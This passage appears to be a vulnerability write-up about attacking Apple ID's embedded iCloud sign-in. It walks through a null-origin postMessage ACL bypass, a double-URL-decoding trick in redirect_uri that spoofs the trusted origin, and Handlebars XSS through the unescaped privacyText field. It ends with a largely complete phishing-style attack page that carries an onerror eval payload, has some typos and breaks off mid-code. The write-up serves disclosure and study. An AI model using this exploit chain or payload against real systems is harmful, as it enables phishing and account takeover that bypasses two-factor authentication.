+We also don't need to worry about anything but `case 8` here because that's where our `PMRPC Sequence Message log Fail At AuthWidget` error is coming from. Case 0 is clearly doing some kind of arcane ritual to configure itself or something anyway and we shouldn't disturb it.
+
+Case 8 is a sequence of `Promise().then().then()`s which are another way other than `async`/`await` of managing asynchronous operations. If any `then()` operation fails, the `catch()` clause is called, which results in us seeing the error we're seeing. Here's the first operation:
+
+```javascript
+new Promise(function(e, n) {
+    it.call({
+        destination: window.parent,
+        publicProcedureName: "ready",
+        params: [{
+            iframeTitle: d.a.getString("iframeTitle")
+        }],
+        onSuccess: function(t) {
+            e(t)
+        },
+        onError: function(t) {
+            n(t)
+        },
+        retries: p.a.meta.FEConfiguration.pmrpcRetryCount,
+        timeout: p.a.meta.FEConfiguration.pmrpcTimeout,
+        destinationDomain: p.a.destinationDomain
+    })
+}
+```
+
+`window.parent` is the key here. `window.parent` is a reference to the embedding window (i.e. in the correct case, iCloud). and it's calling "ready". I imagine it expects a response and since we're not giving one it's failing. As far as this gets us, it's kind of something we could already intuit as it's how all these systems really work. We're going to have to snoop on a successful initialization conversation and try to replicate it.
+
+Snooping on the successful `postMessage` traffic that the real `icloud.com` makes is not easy, especially in this case. If you use Google Chrome Devtools, like I do to write these vulnerabilities, you won't find `postMessage` on the 'network' panel with the other HTTP requests. Additionally to this, if you set up some code to watch `postMessage` traffic across the browser you neeed to get it in *fast*. This whole exchange happens in the first second or so of the page loading in.
+
+I can set a break point on `load` to make the JavaScript stop just as the page loads in, and then run in the console:
+
+```javascript
+window.addEventListener(
+    'message',
+    message => console.log(message)
+)
+```
+
+If I do this, then whenever the iCloud page gets a message from the `idmsa.apple.com` frame, it'll print it to the console. With that, we end up with this:
+
+```json
+pmrpc.{"jsonrpc":"2.0","method":"receivePingRequest","params":["ready"],"id":"9BA799AA-6777-4DCC-A615-A8758C9E9CE2"}
+
+pmrpc.{"jsonrpc":"2.0","method":"ready","params":[{"iframeTitle":" Sign In with Your Apple ID"}],"id":"E0236187-9F33-42BC-AD1C-4F3866803C55"}
+
+pmrpc.{"jsonrpc":"2.0","method":"receivePingRequest","params":["config"],"id":"87A8E469-8A6B-4124-8BB0-1A1AB40416CD"}
+
+pmrpc.{"jsonrpc":"2.0","method":"config","params":[],"id":"252F2BC4-98E8-4254-9B19-FB8042A78E0B"}
+```
+
+The first thing I thought when I saw this was 'geez. that's complicated as hell'. This doesn't tell us a whole lot either, since our event listener only tells us what `idmsa.apple.com` is sending us because the listener is only set on the outer `icloud.com` window. But, we are seeing the `"ready"` message we saw in the code. We just need to know how to reply to it.
+
+This is a situation I've not come across before. Because the `idmsa.apple.com` frame is being generated after page load, we need to bind an event to tell us what it's recieving just as it starts existing. My initial approach to this consisted of trying to use events to try to work out when the `<iframe>` is actually appended:
+
+```javascript
+((() => {
+console.log("postMessage hook added");
+new MutationObserver((mutations, observer) => {
+const flatten = (a,c) => a.concat(c);
+const allNodes =  mutations.filter(({ type }) => type == "childList")
+    .map(({ addedNodes }) => Array.from(addedNodes)).reduce(flatten, []);
+  
+allNodes
+  .forEach(parentNode => {
+    if (!parentNode.getElementsByTagName) return;
+    [...parentNode.getElementsByTagName("iframe")].forEach(iframe => {
+      let x = iframe.contentWindow.postMessage;
+      console.log("hooked", iframe);
+      iframe.contentWindow.postMessage = function(...a) {
+        console.log(`SEND to`, iframe, `${a}`);
+        x.apply(iframe, [...a]);
+      }
+    })
+  })
+  
+  
+}).observe(document.documentElement, {childList: true, subtree: true });
+
+window.addEventListener("message", e => console.log(`RCV from`, e.origin, {...e}))
+})(),false);
+```
+
+As much time as it took to write this, it fails because the `idmsa.apple.com` frame is on a different origin to our embedding frame, `icloud.com`. The browser, as mentioned before blocks pages that don't share the same domain from modifying each other.
+
+The technique that I've found to work best is to use Google Chrome Dev tools' 'Advanced Breakpoint' feature. What it lets you do is inject code at a specific point in some code's execution. If your injected code returns `true`, then the execution stops. But rather than using it to break code, we instead use it to *inject* code on the very first line. So looking at `https://appleid.cdn-apple.com/appleauth/static/jsj/N1575552449/app.js` we set a custom breakpoint on the first line that runs `window.addEventListener('message', m => console.log(m))`.
+
+This gives us the other half of the conversation, because `app.js` runs *as soon as the singin page loads*.
+
+Here's a full, successful annotated conversation between parent (iCloud) and child (Apple ID):
+
+> -> I'm ready, are you ready?
+
+```
+child: pmrpc.{"jsonrpc":"2.0","method":"receivePingRequest","params":["ready"],"id":"9BA799AA-6777-4DCC-A615-A8758C9E9CE2"}
+```
+
+Parent:
+
+> <- yeah bro im ready . lets do this
+
+```
+parent: pmrpc.{"jsonrpc":"2.0","id":"9BA799AA-6777-4DCC-A615-A8758C9E9CE2","result":true}
+```
+
+> <- alright. i am calling myself "Sign In With Your Apple ID"
+
+```
+child: pmrpc.{"jsonrpc":"2.0","method":"ready","params":[{"iframeTitle":" Sign In with Your Apple ID"}],"id":"E0236187-9F33-42BC-AD1C-4F3866803C55"}
+```
+
+> -> cool bro. cool bro. very cool. keep it coming
+
+```
+parent : pmrpc.{"jsonrpc":"2.0","id":"E0236187-9F33-42BC-AD1C-4F3866803C55","result":true}
+```
+
+> <- ok bro, let me know how i should configure the login dialog. that cool bro
+
+```
+child: pmrpc.{"jsonrpc":"2.0","method":"receivePingRequest","params":["config"],"id":"87A8E469-8A6B-4124-8BB0-1A1AB40416CD"}
+```
+
+> -> yeah bro. very cool. very cool.
+
+```
+parent: pmrpc.{"jsonrpc":"2.0","id":"87A8E469-8A6B-4124-8BB0-1A1AB40416CD","result":true}
+```
+
+> <- ok dude hit me with that config stuff
+
+```
+child: pmrpc.{"jsonrpc":"2.0","method":"config","params":[],"id":"252F2BC4-98E8-4254-9B19-FB8042A78E0B"}
+```
+
+> -> no worries my dude. make sure theres a remember me box. and uh. don't need a link to create an account. that wouldn't make sense. do need a link for if they forget their password. call the dialog "sign in with iCloud". heres the logo. keep it fresh my man.
+
+```
+parent: pmrpc.{"jsonrpc":"2.0","id":"252F2BC4-98E8-4254-9B19-FB8042A78E0B","result":{"data":{"features":{"rememberMe":true,"createLink":false,"iForgotLink":true,"pause2FA":false},"signInLabel":"Sign in to iCloud","serviceKey":"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d","defaultAccountNameAutoFillDomain":"icloud.com","trustTokens":["HSARMTnl/S90E=SRVX"],"rememberMeLabel":"keep-me-signed-in","theme":"dark","waitAnimationOnAuthComplete":false,"logo":{"src":"data:image/png;base64,[ ... ]ErkJggg==","width":"100px"}}}}
+```
+
+> <- and I'm out
+
+```
+parent sends: pmrpc.{"jsonrpc":"2.0","id":"252F2BC4-98E8-4254-9B19-FB8042A78E0B","result":true}
+```
+
+Still with me? Cool bro. Very cool. This conversation is kinda complicated, but for most of it we can just send back the mesage ID they send us back and `"result": true`. Here's how I implemented this conversation:
+
+```javascript
+
+      const prefix = "pmrpc."
+
+      if (!data.startsWith(prefix)) throw new Error(`got weird messsage ${JSON.stringify(data)}`);
+
+      // trim off 'pmrpc.'
+      const json = data.slice(prefix.length);
+
+      // extract the request JSON
+      const rq = JSON.parse(json);
+
+      const { method, jsonrpc, params, id } = rq;
+
+      // if we get a config, just return our pre-prepared response
+      if (method == "config") return frame.postMessage(`${prefix}${JSON.stringify({
+        ...config_resp, jsonrpc, id
+      })}`, "*");
+
+
+      // for everything else just tell the child it went OK
+      frame.postMessage(`${prefix}${JSON.stringify({
+        jsonrpc, id, result: true
+      })}`, "*");
+```
+
+I know what you're thinking, postMessage fans. Doesn't `postMessage` secure all of its calls by specifying where the messages go to, making this completely useless? postMessage fans, you'd be correct.
+
+### PostMessage Fans, You'd Be Correct.
+
+[PostMessage Fans, You'd Be Correct.]: #postmessage-fans-youd-be-correct
+[§7]: #postmessage-fans-youd-be-correct
+
+
+We have two problems at this point to address:
+
+1. Messages we send to `idmsa.apple.com` aren't being accepted
+2. The browser rejects messages sent to us from `idmsa.apple.com` because they're specifying the origin `icloud.com`.
+
+While I did this using the minified code `idmsa.apple.com` was running, our solution to (1) is easier illustrated with the original 'pmrpc' source code, from the library apple is using:
+
+```javascript
+ function processPmrpcMessage(eventParams) {
+    var serviceCallEvent = eventParams.event;
+    var eventSource = eventParams.source;
+    var isWorkerComm = typeof eventSource !== "undefined" && eventSource !== null;
+
+    // if the message is not for pmrpc, ignore it.
+    if (typeof serviceCallEvent.data !== "string" || serviceCallEvent.data.indexOf("pmrpc.") !== 0) {
+      return;
+    } else {
+      var message = decode(serviceCallEvent.data);
+
+      if (typeof message.method !== "undefined") {
+        // this is a request
+
+        var newServiceCallEvent = {
+          data : serviceCallEvent.data,
+          source : isWorkerComm ? eventSource : serviceCallEvent.source,
+          origin : isWorkerComm ? "*" : serviceCallEvent.origin,
+          shouldCheckACL : !isWorkerComm
+        };
+
+        var response = processJSONRpcRequest(message, newServiceCallEvent);
+
+        // return the response
+        if (response !== null) {
+          sendPmrpcMessage(
+            newServiceCallEvent.source, response, newServiceCallEvent.origin);
+        }
+      } else {
+        // this is a response
+        processJSONRpcResponse(message);
+      }
+    }
+  }
+```
+
+Notice `shouldCheckACL`? This actually determines if pmrpc should check to see if we are `icloud.com`. It's derived from `!isWorkerComm`. I haven't the faintest idea what a `WorkerComm` is but `isWorkerComm` is calculated right at the top:
+
+```javascript
+ function processPmrpcMessage(eventParams) {
+    var serviceCallEvent = eventParams.event;
+    var eventSource = eventParams.source;
+    var isWorkerComm = typeof eventSource !== "undefined" && eventSource !== null;
+```
+
+Our `postMessage` is assumed to be a 'workerComm' if the source of the event is `undefined` (impossible for us, as we have to be a source), but also more importantly -- we are considered a 'workerComm' if our eventSource is `null`.
+
+I'm not sure what a 'workerComm' is still, but it might be that this system, pmrpc sometimes wants to push messages into here. If these messages are synthetic, they will naturally have no meaningful `source` -- which is normally set to the opening page.
+
+I'm sure you're wondering how we get an opening source of `null`. Surely no page can be located at `null`? Not quite!!
+
+A sandboxed iframe by default considers itself to have the origin `null`. This is so that it can't inherit the origin of its parent and escape the sandbox. Thus, we can bypass the Access Control List (ACL) by just sending all our messages from a sandbox.
+
+```HTML
+<iframe sandbox="allow-scripts"></iframe>
+```
+
+If you try this however, you will hit a major snag. If your origin is `null`, then when `frame-ancestors` checks your HTTP origin to see if you can embed this page it will *always fail*. So if we try to embed the iCloud login on a `null` origin ... we won't be able to.
+
+We can't make a separate `null` frame and also an `idmsa.apple.com` frame and instruct the `null` frame to `postMessage` to it, because our `null` frame needs a reference to the `idmsa.apple.com` frame to call `window.postMessage` on it.
+
+There is, however one trick we have up our sleeves, from long ago before nobody knew what the internet is for and you had to install something called 'macromedia flash player' which put a virus on your computer: it's `window.top.frames`.
+
+If you remember how 'breaking out of iframes' worked before `X-Frame-Options` became a big thing, whenever your page started you'd run code like this:
+
+```javascript
+if (window.top !== window)
+    window.top.location = window.location;
+```
+
+So if some scallywag embeds my fansite in their other page, thus totally STEALING MY CONTENT -- `window.top` will be a reference to their page, not my `window`. In this case, we can set `window.top.location` to our `window.location` redirecting the bastards to my fansite for x86 intel instructions.
+
+`window.top` has another legacy feature -- `window.top.frames`. `window.top.frames` is a reference to every frame embedded in the top window, including us (if we're embedded there).
+
+So if we embed both `null` and `idmsa.icloud.com` in the same page that we control, we can pass the index of `idmsa.icloud.com` to the `null` page over `postMessage`. Then, when we want to send a message to `idmsa.icloud.com`, we can `postMessage` the message to our `null` origin and have it proxy it to `idmsa.icloud.com` at `window.top.frames[index]`
+
+```
+graph TD;
+    op["our page"] --index of idmsa.apple.com--> null;
+    op --> idmsa.apple.com
+```
+
+Our `nullPageCode` waits for a config indicating what the index of `idmsa.apple.com` is on `window.top.frames`, and then forwards any message it gets to that index:
+```javascript
+    const nullPageCode = () => {
+
+      // wait for config
+
+
+      async function main() {
+
+        window.parent.postMessage("ready", "*");
+        const config = await new Promise((ok, fail) => {
+
+          console.log("waiting for config...")
+
+          window.addEventListener("message", ({ data }) => {
+
+            console.log("got config message");
+
+            if (data.type !== "config") return fail(`did not get config, instead got ${JSON.stringify(data)}`);
+
+            return ok(data);
+          }, { once: true })
+
+        });
+
+        console.log({ config });
+        console.log("now any data the null origin gets is sent to the icloud iframe...");
+
+        window.addEventListener("message", ({ data }) => {
+          console.log("forwarding to idmsa", data)
+          window.top.frames[config.idmsaFrameId].postMessage(data, "*");
+        });
+      }
+
+
+      main().catch(e => console.error(e))
+
+    }
+```
+
+
+### It's Not Always That You Need to Read The Spec, But That Always is *Today*. {#reading_the_spec}
+
+[It's Not Always That You Need to Read The Spec, But That Always is Today.]: #reading_the_spec
+[§8]: #reading_the_spec
+
+Now we have a sneaky way to push data to `idmsa.apple.com` without getting checked by the access control list. But how do we receive messages without being `icloud.com`?
+
+I noticed via live debugging that the origin that `idmsa.apple.com` was sending messages to was *not* `icloud.com`, but the full `redirect_uri`, `https://*;@icloud.com`. This is a super odd one because `postMessage` is specified (**[mdn][postMessage MDN]**) like this:
+
+```javascript
+targetWindow.postMessage(message, targetOrigin, [transfer]);
+```
+
+[postMessage MDN]: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage "Window.postMessage() - Web APIs | MDN"
+
+`targetOrigin` would indicate that what should be passed in is an HTTP web origin, which has to be very strictly specified and for which, as mentioned before `https://*;@icloud.com` is absolutely *not* valid. In theory, that'd probably just mean that the call should never be able to get to us, but I dived into the `postMessage` specification, which defines ([whatwg][postMessage spec]) the action of `postMessage` like this:
+
+ 1. Let `targetRealm` be `targetWindow`'s Realm.
+ 2. Let `incumbentSettings` be the incumbent settings object.
+ 3. Let `targetOrigin` be `options["targetOrigin"]`.
+ 4. If `targetOrigin` is a single U+002F SOLIDUS character (/), then set `targetOrigin` to `incumbentSettings`'s origin.
+ 5. Otherwise, if `targetOrigin` is not a single U+002A ASTERISK character (*), then:  
+    1. Let `parsedURL` be the result of running the URL parser on `targetOrigin`.  
+    2. If `parsedURL` is failure, then throw a "SyntaxError" DOMException.
+ 6. Set `targetOrigin` to parsedURL's origin.
+
+[postMessage spec]: https://html.spec.whatwg.org/multipage/web-messaging.html#posting-messages
+
+
+`targetOrigin` is *not* an origin!! `targetOrigin` is technically a URL, from which an origin is extracted. For us, this is especially useful.
+
+Since the real origin is extracted from the `targetOrigin` which we provide, after running the URL parser if we provide a value which parses to *our* origin instead of `www.icloud.com` then we can bypass the intended origin check.
+
+Given that `idmsa.apple.com` appears to perform an origin parse itself, it would be impossible to do this if not for one minor bug in the way that `redirect_uri` is passed to the page's javascript code.
+
+You see, early on in my testing I noticed that if I added `%0a`, which is URL speak for 'new line' in my `redirect_uri`, the page would completely break! The reason for this is that the `redirect_uri` is passed to the Javascript code by generating Javascript code into the page, like this:
+
+```javascript
+bootData.destinationDomain
+    = decodeURIComponent('https://www.icloud.com');  
+```
+Note that the parameter passed to `decodeURIComponent`, which URL decodes the given string is *already* URL decoded. So when `%0A` is present in the URL, the following Javascript gets generated:
+
+```javascript
+bootData.destinationDomain
+    = decodeURIComponent('https://
+;@www.icloud.com');  
+```
+
+Now, Javascript strings that extend to two lines are invalid, and completely prevent the Javascript parser from continuing which breaks the page. Normally, you'd be able to get XSS with an issue like that but despite my best efforts I was unable to because I couldn't produce the `'` that would be needed to escape the string.
+
+It seems at some point in the past, the `redirect_uri` was entering this part of the code URL encoded. But it is no longer, and we can use this to our advantage. This fact means that `bootData.destinationDomain`, which specifies the valid embedding domain actually gets *doubly* URL decoded.
+
+I iterated over some possible options for this, and with much trial and tribulation worked out the best `redirect_uri` was `https%3A%2F%2Fs3-eu-west-1.amazonaws.com%253F%20s3-eu-west-1.amazonaws.com%3B%40www.icloud.com`.
+
+This is a very tricky URL to construct, as it has to satisfy all systems without crashing, and it does, as follows:
+
+1. The Apple ID backend at `idmsa.apple.com`
+decodes the `redirect_uri` ‘`https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com`’
+2. It (correctly) determines that the origin is `wwww.icloud.com` and allows the request through.
+2. The Apple ID backend at `idmsa.apple.com` returns the Content-Security Policy directive ‘`frame-ancestors https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com`’
+3. This indicates to the browser the allowed origins:
+    - `https://s3-eu-west-1.amazonaws.com%3F`, which doesn't exist and
+    - `s3-eu-west-1.amazonaws.com` which is *anything we put in our personal S3 bucket web server*.
+3. `idmsa.apple.com` then generates:
+    -  `bootData.destinationDomain = decodeURIComponent('https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com')`
+    - `bootData.destinationDomain` gets set to ‘`https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com`’ when the page loads.
+4. When passed `https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com` as `targetOrigin`, `postMessage` parses out `https://s3-eu-west-1.amazonaws.com` to be the correct target origin, which allows us to get `postMessage`s from our embedded `idmsa.apple.com`
+
+What's at the end of this long road? Having tricked `idmsa.apple.com` into thinking that we're iCloud, when you log in to our embed with your autofilled email we get an authentication for your Apple account. Even if you don't 2FA! This is because an authentication token is granted without passing 2FA for iCloud 'Find My', used for finding your potentially lost phone which you might need to pass 2FA.
+
+We've compromised the trust between `idmsa.apple.com` and iCloud. But there's more to do here. What if we could take over `idmsa.apple.com` in the user's client? As gullible as users are, our browser doesn't currently show `apple.com` in the address bar. We can't popout the Apple ID login window, because the postMessage code specifically refers to `window.parent`, rather than `window.opener`.
+
+If we manage to get XSS from the position we're in now, we could open a popup from our compromised, embedded page into a 'real' `idmsa.apple.com` page, and attack the popup from our embedded window. Once we've taken over the popup, we can use `window.location.assign('https://apple.com')` to destroy our entry in the user history so it's not possible for the user to see that they were ever on a non-apple website.
+
+### Stealing the Bank From an ATM {#stealing_the_bank_from_an_ATM}
+
+[Stealing the Bank From an ATM]: #stealing-the-bank-from-an-atm
+[§9]: #stealing-the-bank-from-an-atm
+
+Getting `idmsa.apple.com` XSS turned out way, way easier than expected, probably due to the position of leverage we find ourselves in. Apple ID already thinks we're a first party Apple app, and gives us ridiculously free control over how we display the login dialog.
+
+Take a look at the configuration that iCloud sends to Apple ID to request a specific login display:
+
+```json
+parent: pmrpc.{"jsonrpc":"2.0","id":"252F2BC4-98E8-4254-9B19-FB8042A78E0B","result":{"data":{"features":{"rememberMe":true,"createLink":false,"iForgotLink":true,"pause2FA":false},"signInLabel":"Sign in to iCloud","serviceKey":"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d","defaultAccountNameAutoFillDomain":"icloud.com","trustTokens":["HSARMTnl/S90E=SRVX"],"rememberMeLabel":"keep-me-signed-in","theme":"dark","waitAnimationOnAuthComplete":false,"logo":{"src":"data:image/png;base64,[ ... ]ErkJggg==","width":"100px"}}}}
+```
+
+There's a few configs that are just toggles, like `rememberMe`, `createLink` and `iForgotLink`. `pause2FA` is probably the one that 'Find My' uses to defer 2FA until after the user has found their lost iPhone.
+
+But we have much freer inputs for `signInLabel` and `logo.src`. `theme` also implies to me there might be a possible CSS injection as the 'dark' theme no doubt is a CSS class. 
+
+From Chrome Developer Tools, we can search all the recursive assets acquired by the login system as it loads. This should make it pretty easy to find out how these are sanitized and loaded into the page.
+
+There's a few hits for 'signInLabel', but this is the one that stands out most to me:
+
+```javascript
+d()(w.a, "envConfigFromConsumer.signInLabel", "").trim() && n.attr("signInLabel", w.a.envConfigFromConsumer.signInLabel),
+```
+
+It looks like when the config is sent, it gets assigned to `envConfigFromConsumer`. If we look for that, we should be able to find a bunch of configuration options that they *don't* use. If they're not used, then it's much less likely someone has looked at them and thought about security. There's quite a few:
+
+```javascript
+this.attr("testIdpButtonText", d()(w.a, "envConfigFromConsumer.testIdpButtonText", "Test"))
+
+d()(w.a, "envConfigFromConsumer.accountName", "").trim() ? (n.attr("accountName", w.a.envConfigFromConsumer.accountName.trim()),
+
+n.attr("showCreateLink", d()(w.a, "envConfigFromConsumer.features.createLink", !0)),
+
+n.attr("showiForgotLink", d()(w.a, "envConfigFromConsumer.features.iForgotLink", !0)),
+
+n.attr("learnMoreLink", d()(w.a, "envConfigFromConsumer.learnMoreLink", void 0)),
+
+n.attr("privacyText", d()(w.a, "envConfigFromConsumer.privacy", void 0)),
+
+n.attr("showFooter", d()(w.a, "envConfigFromConsumer.features.footer", !1)),
+
+n.attr("showRememberMe") && ("remember-me" === d()(w.a, "envConfigFromConsumer.rememberMeLabel", "").trim() ? n.attr("rememberMeText", l.a.getString("rememberMe")) : "keep-me-signed-in" === d()(w.a, "envConfigFromConsumer.rememberMeLabel", "").trim() && n.attr("rememberMeText", l.a.getString("keepMeSignedIn")),
+
+n.attr("isRememberMeChecked", !!d()(w.a, "envConfigFromConsumer.features.selectRememberMe", !1) || !!d()(w.a, "accountName", "").trim())),
+
+i = d()(w.a, "envConfigFromConsumer.verificationToken", ""),
+```
+
+It's going to be super annoying to test every one of these. If we dig a bit deeper, we can observe that for many of these there are two ways to reference these configuration options. At configuration time, in the configuration we send we refer to many of these by different names than what they're use as later. For example, `rememberMeLabel` actually becomes `rememberMeText`. If we look for that, we can find the sink that puts it onto the page.
+
+Oddly, if we do a regular search via the 'search' panel, the only hits we get are in `app.js` which doesn't actually appear to perform the action of rendering these parameters onto the page. This probably means that these config options are rendered by some externally defined template.
+
+If we go to our 'Network' panel and do a search of all network requests for 'rememberMeText' we strike gold; the templates are defined in `signin` (the HTML page) itself.
+
+```HTML
+{{#if showRememberMe}}
+<div class="si-remember-password">
+    <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox" {($checked)}="isRememberMeChecked">
+    <label id="remember-me-label" class="form-label" for="remember-me">
+    <span class="form-choice-indicator"></span>
+    {{rememberMeText}}
+    </label>
+</div>
+{{/if}}
+```
+
+This is a Handlebars template. It's kinda funny to see a handlebars template in 2019. Handlebars.js was one of the first 'Web 2.0' libraries. If you look up its website it's full of 2010s design choices -- soft rounded corners and lots of negative space. Things that were only just becoming possible with modern CSS.
+
+Handlebars templates pre-date 'taint' based HTML escaping. If you use, say, Go's HTML templating system your injected content will *always* be safely escaped away unless you explicitly whitelist the input by asserting the string as a `template.HTML()` type.
+
+Handlebars decides whether to safely escape content or not based on the number of 'handlebars' around the input, which is a fantastic way to make it really easy for machines to determine if you messed up, but very difficult for human software engineers.
+
+A safe handlebars template string looks like `{{rememberMeLabel}}` and a potentially catastrophically unsafe one looks like `{{{rememberMeLabel}}}`. That's kinda hard to notice!
+
+A quick and simple ctrl-f in the `signin` HTML gets us this:
+
+```HTML
+<p class="sr-only" id="invalidUserNamePwdErrMsg" role="tooltip">
+    {{{errorMessage}}}
+</p>
+</div>
+```
+
+First hit is not so promising. The error message is unescaped, sure but they're usually generated from either a static, hard-coded list of HTML error strings, or something returned from a server we can't manipulate.
+
+```handlebars
+    {{#if showLearnMoreLink}}
+    <div>
+        {{{learnMoreLink}}}
+    </div>
+    {{/if}}
+    {{#if showPrivacy}}
+    <div  class="label-small text-centered centered tk-caption privacy-wrapper">
+            <div class="privacy-icon"></div>
+            {{{privacyText}}} 
+    </div>
+    {{/if}}
+```
+
+Oh now this looks *really* good! From our previous code we already know that `privacyText` is derived from `envConfigFromConsumer.privacy`. Same for `learnMoreLink`, but there's no need to try `learnMoreLink` if `privacyText` already works.
+
+Let's put everything together into one attack page.
+
+```HTML name=rewards.html
+<!DOCTYPE HTML>
+<title>Apple Rewards</title>
+<style type="text/css">
+
+// First, we 
+// clear up any gives that there's
+// something going on by making
+// the Apple ID frame fill
+// the whole page with no border
+.idmsa-frame {
+    width: 100vw;
+    height: 100vh;
+    border: 0;
+}
+
+</style>
+
+<script>
+
+// Next, the null origin allows us to bypass
+// Apple ID's postMessage controls.
+// This function takes some code, and
+// runs it in the null origin.
+const runAsNull = code => {
+    const i = document.createElement(
+        "iframe"
+    );
+
+    // We apply 'sandbox=allow-scripts'
+    // to the iframe. Enabling sandboxing
+    // makes our page have the 'null' origin
+    // we need to bypass Apple ID's recieve
+    // postMessage controls.
+    i.setAttribute(
+        "sandbox",
+        "allow-scripts"
+    );
+
+    // Then, we create an HTML document inside our sandboxed iframe
+    // containing our javascript code.
+    //
+    // Those backtick quotes (`) are just multi-line
+    // quote marks by the way.
+    i.setAttribute(
+        "srcdoc",
+        `<!DOCTYPE HTML>
+<title>null origin</title>
+<body><script>(${javascriptCode})()<\/script></body>
+    `);
+
+
+    // Appends our iframe child, which we called 'i'
+    // to the page's '<body>' element, and gets a handle
+    // on the window the browser made inside the iframe.
+    return document.body
+        .appendChild(i).contentWindow;
+}
+
+
+// This is the code we want to inject into idmsa.apple.com.
+// For now, it's just a pop-up box that says the domain
+// that it's running in.
+//
+// Domains and origins are the fundamental primitives of web
+// security, so if we can open a popup showing 'idmsa.apple.com',
+// we prove to ourselves that we've compromised Apple ID.
+const injection = () => {
+    alert(document.domain);
+}
+
+
+// This is the page we're embedding and attacking. It needs
+// a bunch of parmeters to work, but we'll probably want
+// to reference those parameters a few times
+// so it's easier to define the components of the URL separately.
+const idmsa_base =
+    "https://idmsa.apple.com/appleauth/auth/authorize/signin";
+
+// Here are the parameters we're using against idmsa_base.
+// defining them like this instead of one long URL
+// makes it easier to programmatically alter these parameters
+// if need to to work on our attack.
+const idmsa_params = {
+    client_id: "d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d",
+
+    // Here, the redirect_uri's ? is pre-urlencoded as mentioned
+    // in previous chapters. This causes it to be misinterpreted
+    // by different parts of the system.
+    redirect_uri: `https://s3-eu-west-1.amazonaws.com${encodeURIComponent("?")} s3-eu-west-1.amazonaws.com;@www.icloud.com`,
+    response_mode: "web_message",
+    
+    // I thought it might be possible that this frame_id
+    // needed to change per-request, but it doesn't
+    // so we can just hard code it :)
+    frame_id: "9d8dafd2-0f8c-4901-ab87-7021ffa6f7ff",
+    locale: "en_GB"
+}
+
+// let's make the idmsa frame.
+const idmsa_frame = document.createElement("iframe");
+
+// to inherit our CSS class from before
+idmsa_frame.setAttribute("class", "idmsa");
+
+// this builds the idmsa url. I apologise for the way I build
+// the url encoding stuff. it reads fine to me but uses
+// a bunch of higher-level javascript concepts that
+// might not make a  whole lot of sense.
+idmsa_frame.src = `${idmsa_base}?${
+    Object.entries(idmsa_params)
+        .map(([key, value]) => 
+            [key, value].map(encodeURIComponent).join("="))
+        .join("&")
+}`;
+
+// our null page needs to:
+//   1.  Wait for a config, and remember it
+//   2. Forward all subsequent postMessages to
+//   idmsa.apple.com.
+const nullPageCode = () => {
+    // async functions can wait on asynchronous events.
+    // since we're waiting n a bunch of asynchronous
+    // stuff to happen it only makes sense.
+    async function main() {
+        // tell our parent we're ready.
+        // the onLoad events for iframes have always
+        // been finickity. Waiting on a postMessage
+        // is much easier.
+        window.parent.postMessage("ready", "*");
+
+        // await lets us wait for events that might
+        // happen in the future before continuing.
+        // we don't want to do anything before we
+        // get the config anyway.
+        //
+        // Promises make fantastic adaptors for turning
+        // old style callbacks into async code.
+        const config = await new Promise((ok, fail) => {
+            console.log("waiting for config");
+            
+            // postMessage's event is just called 'message'
+            // i dont really know why.
+            window.addEventListener('message', ({data}) => {
+                console.log("got config message");
+
+                // honestly receiving the wrong postMessage
+                // can happen pretty easily so it's worth
+                // guarding for to save some painful debug
+                // time.
+                if (data.type != config)
+                    reutrn fail(`did not get config, instead got ${JSON.stringify(data)})`);
+                
+                // this completes the promise.
+                return ok(data);
+            // eventListeners default to firing on all
+            // events but everything would probably break
+            // if we did that with this function.
+            }, { once: true });
+        });
+
+        // extract the idmsaFrameId (of window.top.frames)
+        // for later use.
+        const {idmsaFrameId} = config;
+
+        // now the easy part. we just forward everything
+        // to the idmsa page.
+        window.addEventListener("message", ({data}) => {
+            console.log("forwarding to idmsa", data);
+
+
+            // ordinarily "*" would be a bad idea, but because
+            // *we* are the bad guys we don't need to give a
+            // shit about secure coding practices.
+            window.top.frames[idmsaFrameId].postMessage(data, "*");
+        });
+
+        // this is just how you execute an async function
+        // without making javascript annoyed at you.
+        main().catch(e => console.error(e));
+    }
+}
+
+
+// next we'll build our config.
+// we're going to go for an <img src=a onerror> XSS,
+// the reason being that due to a totally ineffectual
+// and super old attempt at global XSS mitigation,
+// we can't inject <script> tags and have them
+// run after the page's first load, which will
+// have fired by this time. This is a bypass.
+//
+// We also btoa (base64 encode) our injection code
+// for transit across the postMessage boundary.
+// this is mainly because managing quotation marks
+// in our HTML injection gets really confusing otherwise,
+// since we're already using ' and " in our <img> code --
+// if these were present in our injection code string, the
+// code would break.
+const injectionHTML = `<img src=a onerror='eval(atob("${
+    bota(`(${injection})()`)
+}"))' />`;
+
+
+// stolen directly from the known good conversation we eavesdropped on.
+// "src" is not actually "[img src]" but a good 8000 characters of
+// base64 encoded image data
+// which I omit so as to not make this unreadable.
+const config_resp = { "jsonrpc": "2.0", "id": "69B33E61-79C4-4A52-9522-63F273B7C349", "result": { "data": { "features": { "rememberMe": true, "createLink": false, "iForgotLink": true, "pause2FA": false }, "signInLabel": "Sign in to get your free Apple giftcard!", "serviceKey": "d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d", "defaultAccountNameAutoFillDomain": "icloud.com", "trustTokens": [], "rememberMeLabel": "keep-me-signed-in", "privacy": injectionHTML, "theme": "dark", "waitAnimationOnAuthComplete": false, "logo": { "src": "[img src]", "width": "100px;color:red" } } } };
+
+
+// add the null page iframe too our page.
+const nullPage = runFunctionInNullOrigin(nullPageCode);
+
+// determine which frame is the idmsa frame.
+let idmsaFrameId;
+
+// there's probably a more elegant way to find what
+// index the idmsa frame is on window.top.frames, but
+// these APIs are so ancient I don't really want to fuck
+// with them and spend ages working out why they won't work.
+for (let i = 0; i < window.top.frames.length; i++) {
